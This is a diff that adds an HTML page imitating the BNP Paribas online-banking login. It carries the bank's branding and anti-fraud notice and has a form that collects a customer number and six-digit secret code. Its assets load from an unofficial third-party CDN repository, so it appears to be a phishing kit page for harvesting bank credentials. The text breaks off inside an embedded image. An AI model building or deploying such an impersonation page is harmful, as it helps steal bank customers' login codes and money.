@@ -1,0 +1,701 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <title>Accéder à mes comptes en ligne | BNP Paribas</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i&display=swap" rel="stylesheet">
+  <style type="text/css">
+    @font-face {
+      font-family: pp_sansregular;
+      src: url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_sans-webfont.woff2) format("woff2"), url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_sans-webfont.woff) format("woff");
+      font-weight: 300;
+      font-style: normal
+    }
+
+    @font-face {
+      font-family: pp_regular;
+      src: url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_type_regular_v2-webfont.eot);
+      src: url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_type_regular_v2-webfont.eot#iefix) format("embedded-opentype"), url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_type_regular_v2-webfont.woff2) format("woff2"), url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_type_regular_v2-webfont.woff) format("woff"), url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_type_regular_v2-webfont.ttf) format("truetype");
+      font-weight: 300;
+      font-style: normal
+    }
+
+    @font-face {
+      font-family: pp_sans_condensed_light;
+      src: url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_sans_cond_light_v2-webfont.eot);
+      src: url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_sans_cond_light_v2-webfont.eot#iefix) format("embedded-opentype"), url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_sans_cond_light_v2-webfont.woff2) format("woff2"), url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_sans_cond_light_v2-webfont.woff) format("woff"), url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/pp_sans_cond_light_v2-webfont.ttf) format("truetype");
+      font-weight: 500;
+      font-style: normal
+    }
+
+    @font-face {
+      font-family: iconpp;
+      src: url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/iconpp.eot);
+      src: url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/iconpp.eot#iefix) format("embedded-opentype"), url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/iconpp.woff) format("woff"), url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/fonts/iconpp.ttf) format("truetype");
+      font-style: normal
+    }
+
+    body {
+      background: #e0dfe0;
+      font-size: 15px;
+      font-family: pp_regular, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    h2 {
+      font-weight: 500;
+      font-size: 3rem;
+      text-transform: uppercase;
+      font-family: pp_sans_condensed_light, Arial, sans-serif;
+      margin: .6em 0;
+      line-height: 1;
+    }
+
+
+    .container {
+      background: #ffffff;
+      max-width: 1400px;
+      padding: 0 0 0 0;
+    }
+
+    .navbar-brand {
+      text-align: center;
+      line-height: 45px;
+    }
+
+    #logo-title {
+      padding-left: 10px;
+      font-family: pp_sansregular;
+      font-size: 1.15rem;
+    }
+
+    #bulb {
+      color: #5b5b5b;
+      text-align: center;
+      line-height: 48px;
+    }
+
+    #bulb:hover {
+      color: #00915a;
+    }
+
+    #become {
+      float: right;
+      width: 181px;
+      height: 48px;
+      color: #fff;
+      text-align: center;
+      line-height: 48px;
+      border-radius: 36px;
+      background: 0 0;
+      background-color: #28c3a9;
+      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .36);
+      padding: 0;
+      text-decoration: none;
+    }
+
+    #become:hover {
+      background-color: #22a58f
+    }
+
+    .border-custom {
+      border: 0.5px solid #dee2e6 !important;
+    }
+
+    .border-custom-bottom {
+      border-bottom: 0.5px solid #dee2e6 !important;
+    }
+
+    #rubbon {
+      background-color: hsla(332, 52%, 42%, 0.8);
+      color: #ffffff;
+      font-size: 1em;
+    }
+
+    .pad-block {
+      background-color: #238c57;
+      background-image: -webkit-linear-gradient(#238c57, #50df54);
+      background-image: linear-gradient(#238c57, #50df54);
+      color: #fff;
+      padding-top: 40px;
+    }
+
+    .nomargin-x {
+      margin-right: 0px !important;
+      margin-left: 0px !important;
+    }
+
+
+    #rubbon a, rubbon a:hover {
+
+      text-decoration: none;
+      color: #fff;
+      border-bottom: dotted 1px #fff;
+    }
+
+    .pad-block-form {
+      width: 411px;
+      margin: 0 auto;
+    }
+
+    form label {
+      font-size: 1.08rem;
+      font-family: pp_regular, Arial, sans-serif;
+    }
+
+
+
+    .form-control {
+      font-size: 2rem;
+      border-color: #1da460 !important;
+      padding: 6px 45px 6px 12px !important;
+      font-family: pp_regular,Arial,sans-serif;
+      border-radius: 3px !important;
+      border: 1px solid #1da460;
+      transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+      height: calc(1em + .75rem + 2px);
+    }
+
+    .form-control-numeric{
+      font-family: pp_sans_condensed_light, Arial, sans-serif;
+    }
+
+
+    .form-control:focus {
+      outline-color: #d0d0d0;
+    }
+
+    .form-control:disabled {
+      cursor: default;
+      background: #ffffff !important;
+    }
+
+    .grid {
+      height: 158px;
+      margin-bottom: 10px;
+    }
+
+    #keyboard {
+      background-repeat: no-repeat;
+      background-size: 100%;
+      height: 100%;
+      width: 100%;
+      font-size: 15px;
+    }
+
+    .keys {
+      text-decoration: none !important;
+      padding: 0 !important;
+      display: block;
+      width: 100%;
+      height: 100%;
+    }
+
+    .wh75 {
+      height: 75px !important;
+      width: 75px !important;
+    }
+
+    .btn-primary, a.btn-primary {
+      color: #fff;
+      background-color: #1da35f !important;
+      background-image: linear-gradient(#1da35f, #1b9a5a);
+      border-color: #188950;
+      font-family: pp_regular, Arial, sans-serif;
+      font-size: inherit;
+      cursor: pointer;
+      text-align: center;
+      border-radius: 3px;
+      padding: 15px 30px;
+      text-decoration: none;
+
+    }
+
+    .btn-primary:hover {
+      background-image: none;
+      border: 1px solid #188950 !important;
+      border-bottom-color: #188950 !important;
+      background-color: #1a6540;
+      background-image: linear-gradient(#1a6540, #1b9a5a)
+    }
+
+    .btn-primary:disabled {
+      background-image: none;
+      border: 1px solid #188950 !important;
+      border-bottom-color: #188950 !important;
+      opacity: .4 !important;
+    }
+
+
+    .section-info-one {
+      background-image: url(https://cdn.jsdelivr.net/gh/powerboxcdnn/cdn/img/laptop.jpg);
+      background-repeat: no-repeat;
+      background-position: right -14px bottom 14px;
+      background-size: 180px 200px;
+    }
+
+    .section-info {
+
+      margin-left: 0;
+      padding: 15px 5%;
+      border-bottom: 1px solid rgba(0, 0, 0, .1);
+    }
+
+    .section-info h2 {
+      font-family: "open sans";
+      font-weight: 700;
+      font-size: 17px;
+      text-transform: none;
+      color: #212121;
+      padding: 0 !important;
+      margin: 0 !important;
+    }
+
+    .icon {
+      font-family: iconpp;
+      speak: none;
+      font-style: normal;
+      font-weight: 400;
+      font-variant: normal;
+      text-transform: none;
+      line-height: 1;
+      background-image: none;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      width: 0;
+      height: 0;
+      display: inline;
+      margin-right: 7px;
+      font-size: 20px;
+      position: relative;
+      top: 2px;
+      font-weight: 600
+    }
+
+
+    .icon-picto-telephone:before {
+      content: "\ea97"
+    }
+
+    .icon-picto-oeil:before {
+      content: "\ea93"
+    }
+
+    .icon-picto-bouclier:before {
+      content: "\ea94"
+    }
+
+    .icon-picto-cadenas:before {
+      content: "\ea95"
+    }
+
+    .col-55 {
+      width: 55%;
+    }
+
+    .url {
+      margin: 10px 0 0;
+    }
+
+    #info p {
+      margin: 10px 0 0;
+      font-family: "open sans";
+      color: #212121;
+      font-size: 15px;
+    }
+
+    #info a {
+      text-decoration: underline;
+      font-weight: 600;
+      color: #00915a;
+    }
+
+    #info strong {
+      font-weight: 600;
+    }
+
+    .footer {
+      position: relative;
+      z-index: 999999999;
+      background-color: #373737;
+      padding: 36px 2.1% 47px;
+      overflow: auto;
+      font-family: "open sans";
+      display: block;
+    }
+
+    .footer-section-one {
+      display: flex;
+      justify-content: center;
+      text-decoration: none;
+    }
+
+    .footer-section {
+      overflow: auto;
+    }
+
+    .footer-border{
+      border-bottom: solid 1px rgba(153, 153, 153, .5);
+    }
+
+    .footer-section_container1 {
+      padding: 0 1.4% 0 1.4%;
+      color: #fff;
+      font-family: "open sans";
+      cursor: pointer;
+      text-decoration: none !important;
+
+    }
+
+    .footer-section_titre1 {
+      color: #e7e7e7;
+      font-family: "open sans";
+      text-transform: uppercase;
+      font-weight: 800;
+      font-size: 15px;
+      border-left: solid 2px #e7e7e7;
+      padding: 0 6.1% 0 6.1%;
+    }
+
+    .footer-section_content1 {
+      color: #999;
+      font-family: "open sans";
+      padding: 0 6.1% 15px 6.1%;
+    }
+
+    .footer-section_mentions-legales p {
+      width: 78%;
+      text-align: center;
+      margin: auto;
+      margin-top: 27px;
+      color: #999;
+      font-size: 13px;
+      font-family: "open sans"
+    }
+
+    .off {
+      opacity: .2 !important;
+    }
+
+
+    .network {
+      width: 428px;
+      display: flex;
+      justify-content: space-between;
+      padding-bottom: 50px;
+    }
+
+    .network span {
+      color: #fff;
+      font-size: 15px;
+    }
+
+    .reset-input {
+      background: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAsCAQAAACN6iPRAAAABGdBTUEAALGPC/xhBQAAACBjSFJN AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAJcEhZ cwAACxIAAAsSAdLdfvwAAAAHdElNRQfjDAcEIh3HnpQRAAACH0lEQVRYw+2Wu2tUURCHv5usLoQV TYIgGx8JygEfpaSzFcRCwVIEyR+gYBEilqKY1nSWYqUgqYKCVdRCRSyM4IxhRaIbCzGoWU3M5o6F IblH7937wG1k5zT3nN/MfJzHnXMCY8PUXEAbrKsdSTuQDqQDyW+l/CF6nbNU+F0bmjxwx9Iignxl RWc4QIBhNDE2ra3Eguv7ZzPRkIDvHHWPI2PbeU2fGufcRGKgRZqYkdTktJisyK4EdVlM7iTFZoeY /ExWDfkoJmfitYynS0Nwm1t5uB185ma8lgmiTwjSbxrXj+mHwhCGaUSQHs7rTVAtCNELQG8k6SV9 tt4b5Yqu53DnCfVeTIr0jZcFf1xmxWTGMOSqmLzztK+yVGzjt7Lqrf0+ahzUST3CRb64PZ7vU7qL 7UnAN3/A7WWKE0xTc9v+8J0jLAYxfyYA7jgAt7PlywbZ4g/ouBrz3GVs4wis2QAxRz0LZNGvcHqN UX64qjvFKw7rQ893uCjkRtRLy5RpuB4Ad4jnNDU6zwpvYtcivXaJyWykF3haJfJ9WUx2FyyQUpdm q+KYVkQzlRVXpVuX0rx0DgqXFQBGKOtiS8RLdjLlPsWKme+TSTFZSVTfi8nbJDXza8WdZJySmr74 aw63dJUB7ruhpNi8D4kGPUBInToh/QxSImCZITefHJUTAtrLNPvpAgwwaoy4R61jckOK2P/zTO1A OpD2mfcztst+AbVvyue1FJo6AAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTEyLTA3VDA0OjM0OjI5 KzAzOjAwrYCZYAAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0xMi0wN1QwNDozNDoyOSswMzowMNzd IdwAAAAASUVORK5CYII=") center -400px;
+      position: absolute;
+      margin: auto -23px;
+      z-index: 1000;
+      cursor: pointer;
+    }
+
+
+    @media (max-width: 767.98px) and (max-width: 575.98px) {
+      .nomobile {
+        display: none !important;
+      }
+
+      .pad-block-form {
+        width: 300px;
+      }
+
+      .grid {
+        height: 125px;
+      }
+
+      .wh75 {
+        height: 50px !important;
+        width: 50px !important;
+      }
+
+      h2 {
+        margin: .3em 0;
+        font-size: 2.5rem;
+      }
+    }
+
+    @media (max-width: 991.98px) and (max-width: 1199.98px) {
+
+    }
+
+
+  </style>
+
+</head>
+<body>
+<div role="main" class="container">
+  <nav class="navbar navbar-light border-custom-bottom">
+    <a class="navbar-brand" href="javascript:void(0)">
+      <img src="data:image/png;base64,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" width="217" height="45" class="d-inline-block align-top" alt="">
+      <span id="logo-title" class="nomobile">La banque d'un monde qui change</span>
+    </a>
+
+    <div class="d-flex flex-row" class="nomobile">
+      <a href="javascript:void(0)" id="bulb" class="nomobile">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 30" height="30" width="30">
+          <g fill="currentColor" fill-rule="evenodd">
+            <path fill-rule="nonzero" d="M5.303 29.189a.75.75 0 0 1-.75-.75v-3.742a.75.75 0 0 1 .75-.75h18.71a.75.75 0 0 1 .75.75v3.742a.75.75 0 0 1-.75.75H5.303zm17.96-1.5v-2.242H6.053v2.242h17.21z"/>
+            <path fill-rule="nonzero" d="M21.018 22.656a.75.75 0 0 1 1.5 0v2.04a.75.75 0 0 1-.75.75H7.36a.75.75 0 0 1-.75-.75V14.34c0-4.357 3.563-7.887 7.954-7.887 4.39 0 7.953 3.53 7.953 7.887v4.315a.75.75 0 1 1-1.5 0V14.34c0-3.526-2.888-6.387-6.453-6.387-3.566 0-6.454 2.861-6.454 6.387v9.607h12.907v-1.29zM3.342 14.814a.75.75 0 1 1 0 1.5H1a.75.75 0 1 1 0-1.5h2.342zM14.993 3.357a.75.75 0 1 1-1.5 0V1.029a.75.75 0 0 1 1.5 0v2.328zM25.787 16.314a.75.75 0 1 1 0-1.5h2.634a.75.75 0 0 1 0 1.5h-2.634zM5.645 7.34a.75.75 0 0 1-.87 1.222L2.78 7.142a.75.75 0 0 1 .87-1.222l1.995 1.42zM23.38 7.653a.75.75 0 0 1-.792-1.274l2.287-1.42a.75.75 0 0 1 .791 1.274l-2.286 1.42z"/>
+            <path d="M14.565 10.73s2.66-.14 3.4 3.688l1.444-.433c-.739-3.826-4.245-4.63-4.245-4.63l-.6 1.375z"/>
+          </g>
+        </svg>
+      </a>
+      <span class="border-custom mx-2 nomobile"></span>
+      <a href="javascript:void(0)" id="become" class="nomobile">Devenir client</a>
+    </div>
+
+  </nav>
+
+
+  <div class="p-3 mt-3 d-flex flex-row" id="rubbon">
+    <div class="mr-4 mt-1">
+      <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-alert-circle">
+        <circle cx="12" cy="12" r="10"/>
+        <line x1="12" y1="8" x2="12" y2="12"/>
+        <line x1="12" y1="16" x2="12.01" y2="16"/>
+      </svg>
+    </div>
+    <p>De faux emails et des appels téléphoniques vous demandant vos coordonnées personnelles et informations bancaires peuvent vous être adressés au nom de BNP Paribas. Il peut s’agir d’une tentative de fraude. Veillez à ne jamais y répondre, ne pas cliquer sur les liens, ni ouvrir les pièces jointes. En cas de suspicion, contactez immédiatement le centre de relation client au 3477.<a href="javascript:void(0)"> En savoir plus</a>
+    </p>
+  </div>
+
+  <div class="row nomargin-x">
+    <div class="col-md-7 pad-block nomargin-x">
+      <div class="pad-block-form">
+        <h2>Accéder à mes comptes</h2>
+        <form class="mb-5" id="form" action="" method="post" autocomplete="off">
+          <div class="form-group">
+            <label>1. Mon numéro client </label>
+            <input class="form-control form-control-numeric" type="text" pattern="[0-9]*" maxlength="10" size="10" name="user" id="user" required>
+            <span class="reset-input"></span>
+          </div>
+          <div class="form-group">
+            <label>2. Mon code secret (6 chiffres)</label>
+            <input type="text" class="form-control off" name="passView" id="passView" disabled>
+            <a class="reset-input" href="#"></a>
+            <input type="password" class="form-control off" id="pass" maxlength="6" name="password" required disabled hidden>
+          </div>
+          <div class="grid off" id="pad">
+            <table id="keyboard" cellpadding="0" cellspacing="0" border="0" background="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZ8AAACgCAMAAADkZ5FqAAAABGdBTUEAALGPC/xhBQAAACBjSFJN AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAACglBMVEUAAAAge00ge00ge00g e00ge00ge00ge00ge00ge0221MTw9vP+/v7n8eyjybYge00ge02+2cuDtZwge00ge033+vnE3NAg e03S5Nsge03S5NrR49rQ4tnP4djO4NfO39bN39bM3tXL3dTK3NPK29LJ29LI2tHH2dDG2M/G187F 187E1s3K3dT1+fcge00ge02w0MDz+PVppogge00ge00ge02vz7/e6+Tp8u7S5Nt/s5kge00ge00g e00ge03////+/v79/f38/Pz7+/v6+vr5+fnc3d2/wcHq6+uTl5dZX2BobW6ipaWUmJgfJyjNz88u NTZLUVLBw8OWmptqb3CVmZk8Q0Slqanw8fF5fX52e3z4+PiHi4ve39++wMGIjIywsrM9REXd3t5M UlPq6urNzs5aYGGWmpqws7OVmZrb3NyHi4yUmJnAwsLAwsP39/daYGDp6elpb2/s7e3DxcahpKWk p6f29vZ3e3zr7OyipqbLzc29v7/Z2tvo6OiSlZY8Q0OusbF1enpKUVG0trf19fWEiYnO0NC8vr5b YWGfo6ORlZXY2tp4fX7v8PDn5+dKUVL09PSytLWusLGSlpbm5ua9wMCTlpfz8/OtsLDX2Nisr691 enueoaLy8vLIycqDh4hZX191eXpnbG3k5OXW19eQk5S6vLxzeHlla2usrq9JUFGkp6jx8fGQlJSB hYa5u7vS1NTh4uLw8PDv7+/u7u7t7e3s7OzDxcWFiYpobm6ytbWxtLShpKTP0dF2e3stNTZYXl+0 t7ff4OFmbGzu7+/KzMzR09Pt7u67vb7Y2dlKUFGztrbl5eW6vb1YXV7JyspXXV6eoaGrrq5JUFBl amtd7gXbAAAAP3RSTlMABkJgcG5YKgxks+v94alGRLuVHGbzvz7NSM3Nzc3Nzc3Nzc3Nzc3Nzc3N 